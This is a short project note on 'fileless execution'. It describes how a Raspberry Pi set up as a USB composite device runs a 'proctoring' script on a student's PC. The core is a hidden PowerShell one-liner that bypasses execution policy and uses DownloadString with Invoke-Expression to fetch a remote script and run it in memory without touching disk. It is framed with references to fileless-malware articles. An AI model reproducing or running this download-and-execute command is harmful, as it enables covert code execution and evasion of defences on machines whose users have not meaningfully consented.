# 1. Fileless 

**Prerequisite:**
- The Raspberry Pi has already been configured to achieve composite mode (See Libcomposite for more info)
- The Raspberry Pi has internet connection

## 1. Fileless Execution
Conducting the proctoring without needing to copy external binary executable to devices. Instead, use existing software, particularly Powershell, to download additional scripts and run them purely in memory. 

Reference materials:
- https://www.mcafee.com/enterprise/en-us/assets/solution-briefs/sb-fileless-malware-execution.pdf
- https://www.varonis.com/blog/fileless-malware
- https://www.linkedin.com/pulse/go-hell-powershell-powerdown-attacks-kirtar-oza-cissp-cisa-ms-

```
powershell.exe -executionpolicy bypass -w hidden "iex(New-Object System.Net.WebClient).DownloadString('<proctoring script url>')
```
Executing the above allow us conduct proctoring directly in to the memory of the Student's PC.  
This is possible because of two Powershell command 
- "DownloadString" where it does not download any file to disk but copies content of the remote file. 
- "Invoke-Expression a.k.a iex" where it runs specified string as a command.
